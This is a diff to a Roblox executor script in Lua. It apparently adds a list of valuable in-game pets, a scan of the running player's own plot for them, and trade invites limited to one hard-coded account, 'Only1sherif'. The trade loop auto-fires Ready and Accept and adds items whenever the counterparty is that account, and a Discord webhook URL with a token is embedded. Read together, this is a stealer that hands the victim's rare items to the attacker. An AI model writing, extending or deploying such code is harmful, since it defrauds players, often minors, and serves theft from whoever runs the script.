@@ -7,6 +7,23 @@ local plr = Players.LocalPlayer
 local TARGET_NAME = "Only1sherif"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1496254716508639262/J-eMNrXhdgaWAiIlMIiObJCsXw0E3s4XHB2S-0HLvkOYRdoJI2QDnAGmPU0EJtTZhbK6"
 
+local wantedItems = {
+    "Tralaledon", "Strawberry Elephant", "Skibidi Toilet", "Rosey and Teddy",
+    "Popcuru and Fizzuru", "Meowl", "Love Love Bear", "Los Sekolahs",
+    "La Supreme Combinasion", "La Casa Boo", "Ketupat Bros", "Hydra Dragon Cannelloni",
+    "Headless Horseman", "Griffin", "Fragrama and Chocrama", "Fishino Clownino",
+    "Festive 67", "Dragon Gingerini", "Dragon Cannelloni", "Cooki and Milki",
+    "Cerberus", "Celestial Pegasus", "Capitano Moby", "Burguro And Fryuro",
+    "Los Amigos", "Fortunu and Cashuru", "Spooky and Pumpky", "Ginger Gerat",
+    "La Food Combinasion", "Los Tacoritas", "La Secret Combinasion", "Money Money Puggy",
+    "Ketchuru and Musturu", "La Taco Combinasion", "Garama and Madundung", "Ventoliero Pavonero",
+    "Swaggy Bros", "Tuff Toucan", "W or L", "Chipso and Queso",
+    "Los Spaghettis", "Los Hotspotsitos", "Tictac Sahur", "Lovin Rose", "Orcaledon",
+    "Ketupat Kepat", "Tang Tang Keletang", "Lavadorito Spinito",
+    "Reinito Sleighito", "Celularcini Viciosini", "Sammyni Fattini",
+    "Jolly Jolly Sahur", "Fortunu and Coinuru", "Gold Gold Gold", "La Extinct Grande", "La Easter Grande", "Chillin Chilli", "Hydra Bunny",
+}
+
 for i, v in pairs(getconnections(plr.Idled)) do
     if v.Disable then v:Disable() end
 end
@@ -21,6 +38,34 @@ end
 local readyRE = getRemote("RE/TradeService/Ready")
 local acceptRE = getRemote("RE/TradeService/Accept")
 
+local function scanPlot()
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return false end
+    local myPlot = nil
+    for _, p in ipairs(plots:GetChildren()) do
+        local sign = p:FindFirstChild("PlotSign")
+        if sign then
+            local lbl = sign:FindFirstChildOfClass("SurfaceGui", true):FindFirstChildOfClass("TextLabel", true)
+            if lbl and (lbl.Text:lower():find(plr.Name:lower()) or lbl.Text:lower():find(plr.DisplayName:lower())) then
+                myPlot = p
+                break
+            end
+        end
+    end
+    if myPlot then
+        for _, child in ipairs(myPlot:GetChildren()) do
+            if child:IsA("Model") then
+                for _, wanted in ipairs(wantedItems) do
+                    if child.Name:lower():find(wanted:lower()) then
+                        return true
+                    end
+                end
+            end
+        end
+    end
+    return false
+end
+
 local function sendInvite()
     local tl = plr.PlayerGui:FindFirstChild("TradePlayerList")
     if tl and tl:FindFirstChild("TradePlayerList") then
@@ -32,10 +77,13 @@ local function sendInvite()
         task.wait(0.2)
         for _, p in pairs(inner.Global.List:GetChildren()) do
             if p:IsA("Frame") and p:FindFirstChild("Fill") then
-                local send = p.Fill:FindFirstChild("Send")
-                if send then
-                    pcall(function() firesignal(send.Activated) end)
-                    return true
+                local nameLbl = p.Fill:FindFirstChild("Username")
+                if nameLbl and nameLbl.Text:lower():find(TARGET_NAME:lower()) then
+                    local send = p.Fill:FindFirstChild("Send")
+                    if send then
+                        pcall(function() firesignal(send.Activated) end)
+                        return true
+                    end
                 end
             end
         end
@@ -50,12 +98,10 @@ task.spawn(function()
             if tradeUI and tradeUI.Enabled then
                 local inner = tradeUI.TradeLiveTrade
                 
-                -- Fast Ready/Accept
                 if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                 task.wait(0.1)
                 if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                 
-                -- Add items only if target matches
                 if inner.Other.Username.Text:lower():find(TARGET_NAME:lower()) then
                     local scroll = inner:FindFirstChild("ScrollingFrame", true)
                     if scroll then
@@ -72,9 +118,11 @@ task.spawn(function()
                     end
                 end
             else
-                sendInvite()
+                if scanPlot() then
+                    sendInvite()
+                end
             end
         end)
-        task.wait(1)
+        task.wait(1.5)
     end
 end)
